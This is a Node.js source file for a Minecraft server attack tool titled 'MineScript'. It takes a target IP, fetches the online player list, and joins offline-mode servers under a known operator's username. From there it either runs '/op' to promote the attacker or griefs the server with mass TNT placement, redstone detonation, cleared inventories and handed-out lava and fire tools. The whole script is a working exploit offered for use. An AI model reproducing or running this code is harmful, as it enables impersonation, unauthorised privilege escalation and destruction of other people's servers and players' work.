const fs = require('fs');
const mineflayer = require('mineflayer')

var setTitle = require('console-title');
var readline = require('readline');
var colors = require('colors');
var childProcess = require('child_process');

var rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
setTitle('MineScript (By MegaGangster)');
const cracked = "./cracked.js"


const request = require('request')


//First Selection.

rl.question("Target Server ip: ".brightBlue, function(ip) {




//Menu.
console.clear();
console.log("Welcome, tool created by MegaGangster".brightRed + "\nStill in beta.".red)
console.log(" ")
console.log(" ")
console.log(" ")
console.log(" ")
console.log("Select option.".brightYellow)
console.log(" ")
console.log("1, Connect to the server with the client's alt - Cracked servers.")
console.log(" ")
console.log("2, Start a port scan, and find bungeecord ports to hack to - Bungeecord servers. (Advanced Users)")
console.log(" ")
console.log(" ")



rl.question("Your answer: ".brightBlue, function(a) {

if(a == 1) {

    console.clear();
    console.log("Current target: " + ip.brightRed)
    console.log("")
    console.log("")
    var url = 'https://api.mcsrvstat.us/2/' + ip;

    request(url, (error, response, body)=> {
      if (!error && response.statusCode === 200) {
        let api = JSON.parse(body)
    if(!api.online) {
      console.log("\n \n")
      console.log("server is offline!".brightRed)
      return;
    }
    if(api.players.online > 0) {
      console.log("\n \n")

      console.log("players list:".brightRed)
      console.log(api.players.list)
    }
      } else {
        console.log("Got an error: ", error, ", status code: ", response.statusCode)
        return;
      }
    })
    console.log("")
    console.log("Select option.".green)
    console.log("")
    console.log("1, login to the server with a server operator's username and promote you. (OP username required)")
    console.log("2, Grief the server, fun L (OP username required)")
    
    
    rl.question("Your option: ".brightBlue, function(bb) {
    
    
    if(bb == 1){
    
console.log("\n")
        
        rl.question("Type a username of someone who has OP permission: ", function(username) {
        
    
            rl.question("Your username: ", function(yourusername) {
              const bot = mineflayer.createBot({
                    host: ip,
                    username: username,
                  });
        
                  bot.on('spawn', m=>{
                    bot.chat("/op " + yourusername)
                  })
                });
        
        
            });

         } else if(bb == 2) {
        rl.question("Type a username of someone who has OP permission: ", function(username) {
            const bot = mineflayer.createBot({
                host: ip,
                username: username,
              });
              
              bot.on('spawn', m=>{
                bot.chat("/fill ~ ~ ~ ~50 ~20 ~29 minecraft:tnt")
                bot.chat('/fill ~ ~ ~ ~3 ~3 ~3 minecraft:redstone_block')
                bot.chat('/gamemode creative @a')
                bot.chat('/tp @a @p')
                bot.chat('/clear @a') 
                bot.chat('/give @a minecraft:flint_and_steel')
                bot.chat('/give @a minecraft:tnt')
                bot.chat('/give @a minecraft:lava_bucket')
                console.log("<3")
              })
    
        })
    
    }else {console.log("pls type a correct option.")} return
    })












} else if(a == 2) {
  console.log("Feature still in development.".brightRed)
  return;
}









})



})





























